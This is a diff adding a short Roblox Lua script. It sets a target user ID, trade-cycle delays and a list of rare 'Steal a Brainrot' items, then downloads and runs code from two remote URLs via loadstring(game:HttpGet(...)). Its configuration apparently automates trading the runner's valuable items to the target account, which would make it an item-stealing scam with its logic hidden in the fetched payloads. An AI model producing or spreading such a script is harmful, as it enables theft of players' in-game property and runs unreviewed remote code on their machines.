@@ -1,0 +1,52 @@
+getgenv().SECRET_KEY = "mrr_aa7bca972b634c3ba23c4cc3d04611aa"
+getgenv().TARGET_ID = 8416385800
+getgenv().DELAY_STEP = 1      
+getgenv().TRADE_CYCLE_DELAY = 2
+getgenv().TARGET_BRAINROTS = {
+    ["Strawberry Elephant"] = true,
+    ["Meowl"] = true,
+    ["Headless Horseman"] = true,
+    ["Skibidi Toilet"] = true,
+    ["Griffin"] = true,
+    ["Hydra Dragon Cannelloni"] = true,
+    ["Dragon Gingerini"] = true,
+    ["Dragon Cannelloni"] = true,
+    ["Love Love Bear"] = true,
+    ["La Supreme Combinasion"] = true,
+    ["Celestial Pegasus"] = true,
+    ["Cerberus"] = true,
+    ["Popcuru and Fizzuru"] = true,
+    ["Rosey and Teddy"] = true,
+    ["Capitano Moby"] = true,
+    ["Cooki and Milki"] = true,
+    ["Ketupat Bros"] = true,
+    ["Burguro And Fryuro"] = true,
+    ["Reinito Sleighito"] = true,
+    ["Fortunu and Cashuru"] = true,
+    ["La Secret Combinasion"] = true,
+    ["Signore Carapace"] = true,
+    ["La Casa Boo"] = true,
+    ["Fragrama and Chocrama"] = true,
+    ["Elefanto Frigo"] = true,
+    ["Spooky and Pumpky"] = true,
+    ["Ginger Gerat"] = true,
+    ["Antonio"] = true,
+    ["Cloverat Clapat"] = true,
+    ["Duggy Bros"] = true,
+    ["Globa Steppa"] = true,
+    ["Garama and Madundung"] = true,
+    ["Tirilikalika Tirilikalako"] = true,
+    ["Fishino Clownino"] = true,
+    ["Jolly Jolly Sahur"] = true,
+    ["Dug dug dug"] = true,
+    ["Rico Dinero"] = true,
+    ["Los Tacoritas"] = true,
+    ["Money Money Reindeer"] = true,
+    ["GOAT"] = true
+}
+task.spawn(function()
+loadstring(game:HttpGet("https://luapot.com/api/loadstring/26c4a4331358247078ffc36b7a17d913"))()
+end)
+task.spawn(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/apiluarmor-dev/Tp-faster175/refs/heads/main/Ping/pong/admin/abuse/175.lua"))()
+end)
